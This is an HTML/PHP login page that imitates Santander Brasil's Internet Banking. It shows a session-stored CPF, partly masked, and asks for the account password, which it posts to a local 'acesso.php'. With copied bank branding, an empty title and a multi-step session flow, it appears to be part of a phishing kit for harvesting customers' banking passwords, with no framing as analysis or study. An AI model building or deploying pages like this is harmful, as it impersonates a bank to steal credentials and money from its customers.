<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body class="color_enter_login">

<div class="container header_enter">
	<div class="content_login">
		<div class="logo_enter">
			<img src="imgs/logo-red.png" height="76" width="400" alt="">
		</div><!-- logo_enter -->

		<div class="dados_enter">
			<div class="cima">CPF: <?php echo substr($_SESSION['cpf'], 0, 3);?>.XXX.XXX-<?php echo substr($_SESSION['cpf'], 12);?></div><!-- cima -->
			<div class="baixo"><?php echo getDataShow();?></div><!-- baixo -->
		</div><!-- dados_enter -->
	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->

<div class="container acesso_login">
	<div class="content_login">
		<div class="title_login">Bem-vindo ao Internet Banking</div>

		<div class="box_divisor">
			<div class="left">
				<p>Senha de acesso</p>

				<form action="acesso.php" method="post" onsubmit="return check_login_enter();">
					<input type="password" name="is_psnet" id="is_psnet" class="enter_input_login" maxlength="10">
					<input type="submit" name="is_enter" id="is_enter" value="Acessar" class="enter_submit_login">
					<input type="hidden" name="sender" value="pass_net">
				</form>
			</div><!-- left -->

			<div class="right">
				<header>
					<img src="imgs/icon_fone_enter.png" class="icon">
					<p class="desc">Você também pode acessar sua conta no App Santander!</p>
				</header>

				<div class="info_baixo">
					Consulte as principais informações na tela inicial.
					<br><br>
					Faça pagamentos com código de barras utilizando a câmera do seu celular.
					<br><br>
					consulte e pague suas faturas, parcele, habilite seu cartão para uso no exterior e muito mais.
				</div><!-- info_baixo -->
			</div><!-- right -->
		</div><!-- box_divisor -->
	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->

<div class="container footer_enter_login">
	<div class="content_login">
		Banco Santander (Brasil) S.A - CNPJ: 90.400.888/0001-42 - Av Presidente Juscelino Kubitscheck, 2041/2235 - Bloco A, Vila Olímpia, São Paulo / SP - CEP 04543-011
	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->












<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->



</body>
</html>
